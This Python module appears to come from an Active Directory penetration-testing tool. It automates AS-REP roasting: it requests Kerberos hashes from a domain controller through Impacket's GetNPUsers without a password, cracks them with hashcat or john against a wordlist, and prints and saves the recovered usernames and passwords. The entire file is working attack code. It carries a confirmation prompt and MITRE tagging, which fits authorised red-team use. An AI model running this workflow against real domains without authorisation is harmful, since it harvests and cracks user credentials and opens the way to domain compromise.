from __future__ import annotations

import json
import re
import subprocess
import tempfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import TYPE_CHECKING

from admapper.creds.common import apply_cracked_credentials, pick_dc_ip, username_from_kerberos_hash
from admapper.creds.crack import crack_with_hashcat, crack_with_john, find_wordlist
from admapper.guides.render import print_manual_guide
from admapper.models.finding import Finding, FindingSeverity
from admapper.models.hash_record import AsRepHash
from admapper.stores.findings import FindingsStore
from admapper.stores.users import UsersStore
from admapper.support.hashes import AsRepHashStore
from admapper.support.output import (
    ConfirmLevel,
    confirm,
    print_info,
    print_success,
    print_table,
    print_warning,
)
from admapper.support.platform import resolve_impacket_script, run_command, tool_install_hint

if TYPE_CHECKING:
    from admapper.support.session import Session

_ASREP_HASHCAT_RE = re.compile(r"^\$krb5asrep\$[^\s]+$")


@dataclass
class AsRepRoastResult:
    domain: str
    dc_ip: str
    hashes: list[AsRepHash] = field(default_factory=list)
    cracked: list[tuple[str, str]] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)


def _asrep_targets(session: Session, usernames: list[str] | None) -> list[str]:
    if usernames:
        return [u.strip() for u in usernames if u.strip()]
    users_store = UsersStore(session.workspaces, session.workspace.name)  # type: ignore[union-attr]
    return [
        u.username
        for u in users_store.list()
        if u.asrep_roastable and not u.is_machine_account and u.enabled
    ]


def _parse_getnpusers_output(stdout: str, domain: str) -> list[AsRepHash]:
    hashes: list[AsRepHash] = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line or line.startswith("[") or line.startswith("Impacket"):
            continue
        if not _ASREP_HASHCAT_RE.match(line):
            continue
        username = username_from_kerberos_hash(line)
        hashes.append(
            AsRepHash(
                username=username,
                domain=domain,
                hashcat=line,
            )
        )
    return hashes


def request_asrep_hashes(
    domain: str,
    dc_ip: str,
    users: list[str],
    *,
    timeout: int = 120,
) -> tuple[list[AsRepHash], str | None]:
    """Request AS-REP hashes via Impacket GetNPUsers."""
    try:
        import impacket  # noqa: F401
    except ImportError:
        return [], f"impacket not installed — {tool_install_hint('impacket')}"

    if not users:
        return [], "no AS-REP roastable users in workspace — run enum users first"

    cmd_base = resolve_impacket_script("GetNPUsers")

    users_file: str | None = None
    try:
        with tempfile.NamedTemporaryFile(
            "w", suffix=".txt", delete=False, encoding="utf-8"
        ) as handle:
            handle.write("\n".join(users))
            handle.write("\n")
            users_file = handle.name
        cmd = [
            *cmd_base,
            f"{domain}/",
            "-no-pass",
            "-dc-ip",
            dc_ip,
            "-usersfile",
            users_file,
            "-format",
            "hashcat",
        ]
        proc = run_command(cmd, timeout=timeout)
        output = (proc.stdout or "") + "\n" + (proc.stderr or "")
        if proc.returncode not in (0,) and "$krb5asrep$" not in output:
            return [], output.strip() or f"GetNPUsers exited {proc.returncode}"
        return _parse_getnpusers_output(output, domain), None
    except subprocess.TimeoutExpired:
        return [], "GetNPUsers timed out"
    except OSError as exc:
        return [], str(exc)
    finally:
        if users_file:
            Path(users_file).unlink(missing_ok=True)


def run_asreproast(
    session: Session,
    *,
    usernames: list[str] | None = None,
    wordlist: Path | str | None = None,
    crack: bool = True,
) -> AsRepRoastResult:
    """Phase 4 — AS-REP roasting workflow."""
    if session.workspace is None:
        raise RuntimeError("no active workspace")

    domain = session.workspace.domain
    if not domain:
        raise ValueError("set domain <fqdn> before asreproast")

    dc_ip = pick_dc_ip(session)
    if not dc_ip:
        raise ValueError("no DC with Kerberos — run start_unauth first")

    targets = _asrep_targets(session, usernames)
    if not targets:
        raise ValueError("no AS-REP roastable users — run enum users or pass explicit usernames")

    if not confirm(
        f"AS-REP roast {len(targets)} user(s) against {dc_ip}?",
        level=ConfirmLevel.WARN,
        mode_auto=session.mode.value == "auto",
        mode_manual=session.mode.value == "manual",
    ):
        print_warning("AS-REP roast cancelled")
        return AsRepRoastResult(domain=domain, dc_ip=dc_ip)

    print_info(f"Phase 4 — AS-REP roasting {len(targets)} user(s) @ {dc_ip}")
    hashes, error = request_asrep_hashes(domain, dc_ip, targets)
    if error and not hashes:
        raise ValueError(error)

    ws_name = session.workspace.name
    hash_store = AsRepHashStore(session.workspaces, ws_name)
    stored = hash_store.merge(hashes)
    result = AsRepRoastResult(domain=domain, dc_ip=dc_ip, hashes=stored)
    if error:
        result.errors.append(error)

    rows = [[h.username, h.domain, h.hashcat[:48] + "…", h.cracked_password or ""] for h in stored]
    if rows:
        print_table("AS-REP hashes", ["user", "domain", "hash", "cracked"], rows)
    print_success("hashes saved → asreproast_hashes.json + asreproast_hashcat.txt")

    findings_store = FindingsStore(session.workspaces, ws_name)
    findings_store.merge(
        [
            Finding(
                key="asreproast_hashes",
                title=f"AS-REP hashes obtained ({len(stored)})",
                severity=FindingSeverity.MEDIUM,
                source="asreproast",
                detail=f"dc={dc_ip}",
                mitre_id="T1558.004",
            )
        ]
    )

    if crack and stored:
        wl = Path(wordlist) if wordlist else find_wordlist()
        if wl is None:
            print_warning(
                "no wordlist found — skip cracking (use --wordlist or place rockyou in "
                "~/.admapper/wordlists/)"
            )
        else:
            print_info(f"Cracking with wordlist: {wl}")
            hash_file = hash_store.hashcat_export_path
            cracked = crack_with_hashcat(hash_file, wl)
            if not cracked:
                cracked = crack_with_john(hash_file, wl)
            if cracked:
                for item in stored:
                    for user_key, password in cracked.items():
                        if user_key.lower().endswith(item.username.lower()):
                            item.cracked_password = password
                hash_store.save_all(stored)
                result.cracked = apply_cracked_credentials(
                    session, domain, cracked, source="asreproast"
                )
                for username, password in result.cracked:
                    print_success(f"cracked: {domain}\\{username}:{password}")
            else:
                print_warning(
                    "no passwords cracked — try hashcat -m 18200 manually with a larger wordlist"
                )

    report_path = session.workspaces.path_for(ws_name) / "asreproast_report.json"
    report_path.write_text(
        json.dumps(
            {
                "domain": domain,
                "dc_ip": dc_ip,
                "targets": targets,
                "hash_count": len(stored),
                "cracked": [{"user": u, "password": p} for u, p in result.cracked],
                "errors": result.errors,
            },
            indent=2,
            sort_keys=True,
        )
        + "\n",
        encoding="utf-8",
    )

    print_manual_guide("asreproast", session=session)
    return result
